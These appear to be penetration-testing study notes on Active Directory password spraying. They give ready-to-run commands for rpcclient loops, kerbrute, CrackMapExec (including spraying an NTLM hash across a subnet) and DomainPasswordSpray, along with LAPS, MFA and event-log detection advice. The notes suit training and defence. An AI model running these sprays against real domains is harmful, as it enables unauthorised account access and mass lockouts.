# Internal Password Spraying - from Linux
## Internal Password Spraying from a Linux Host (==no== domain-joined )

```bash
# Using a Bash one-liner for the Attack
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" <DC-IP> | grep Authority; done
  # find : Account Name: tjohnson, Authority Name: INLANEFREIGHT

# Using Kerbrute for the Attack
kerbrute passwordspray -d inlanefreight.local --dc <DC-IP> valid_users.txt  Welcome1

# Using CrackMapExec & Filtering Logon Failures
sudo crackmapexec smb <DC-IP> -u valid_users.txt -p Password123 --continue-on-success | grep +
```

## Local Administrator Password Reuse


- If you obtain **administrative** access and the **NTLM password hash or cleartext password** for the local administrator account (**or another privileged local account**), this can be **attempted across multiple hosts in the network.** 
- If we find a **desktop host** (workstation host) with the **local administrator account** password set to something unique such as `$desktop%@admin123`, it might be worth attempting `$server%@admin123` against servers. 
- if we find **non-standard local administrator accounts** such as `bsmith`, we may find that the **password is reused** for a **similarly named domain user account**
-  If we retrieve the password for a **domain user** `ajones`, it is worth trying the **same password** on their **domain admin account** (if the user has one), it cloud be like `ajones_adm`(**privileged domain user**)
- We may obtain valid credentials for a **user in domain A** that are valid for a user with the same or similar username in **domain B**
- It is worth targeting high-value hosts such as **SQL or Microsoft Exchange servers**, as they are more likely to have a highly privileged **user logged** in or have their **credentials persistent in memory**.




 if we retrieve the NTLM hash for the l**ocal administrator account** from the local SAM database. In these instances, we can **spray the NT hash across an entire subnet** (or multiple subnets) to hunt for **local administrator accounts with the same password set**.
```bash
#### Local Admin Spraying with CrackMapExec
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

>This technique, while effective, is quite noisy and is not a good choice for any assessments that require stealth.
>One way to remediate this issue is using the free Microsoft tool [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) to have Active Directory manage local administrator passwords and enforce a unique password on each host that rotates on a set interval.


# Internal Password Spraying - from Windows

From a foothold on a domain-joined Windows host, the [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) tool is highly effective. If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out. Like how we ran the spraying attack from our Linux host, we can also supply a user list to the tool if we are on a Windows host but not authenticated to the domain.
## Internal -  domain-joined
Since the host is domain-joined, we will skip the `-UserList` flag and let the tool generate a list for us.
```bash
# Using DomainPasswordSpray.ps1
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

# using Kerbrute.exe
.\kerbrute_Windows.exe passwordspray -d <DOMAIN_NAME> .\userlist.txt Welcome1 --dc <DC_IP> --output spray_success.txt
```

## External Password Spraying
==While outside the scope of this module== . **external Password Spraying** means doing the same spraying technique you learned, but **from the internet** instead of inside the internal network.

- The goal is to guess one valid username/password combo to get into something exposed online.
- Once you log in, you may get email access, remote desktop, VPN access, or an internal web app — which can give you a foothold in the organization.

**Typical external targets (all often use Active Directory accounts):**

- **Microsoft 365** accounts
- **Outlook Web Access / Exchange Web Access** (email login pages)
- **Skype for Business / Lync Server** (corporate chat)
- **Remote Desktop Services (RDS) portals**
- **Citrix portals** (virtual desktops)
- **VMware Horizon VDI** (virtual desktop infrastructure)
- **VPN portals** (Citrix, SonicWall, OpenVPN, Fortinet, etc.)
- **Custom websites** that use AD login

Basically, anything **publicly accessible** that uses the same **domain usernames and passwords** can be a target for spraying from outside.

# Mitigations

- **Multi-factor Authentication** – Use MFA (push, OTP, RSA, SMS) on all external portals; prevents login but may still leak valid creds.
- **Restricting Access** – Limit app access to only necessary domain users (least privilege).
- **Reduce Impact** – Use separate admin accounts, app-specific permissions, and network segmentation to slow/stop lateral movement.
- **Password Hygiene** – Educate users on strong passphrases; enforce password filters to block common/dictionary/company-related words.

>It is vital to ensure that your domain password lockout policy doesn’t increase the risk of denial of service attacks. If it is very restrictive and requires an administrative intervention to unlock accounts manually, a careless password spray may lock out many accounts within a short period.

## Detection
- Look for:
    - Many account lockouts in a short period.
    - App/server logs showing multiple login attempts (valid & invalid users).
    - High volume of requests to the same app/URL.
- **Event ID 4625** → Failed SMB logons in short time (password spraying).
- Correlate many failed logons within a set time window.
- Savvy attackers may avoid SMB and use **LDAP** instead.
- **Event ID 4771** → Kerberos pre‑auth failed (can indicate LDAP/Kerberos spraying) — requires Kerberos logging enabled.
- Fine‑tuned logging + correlation rules = stronger detection of internal & external spraying.

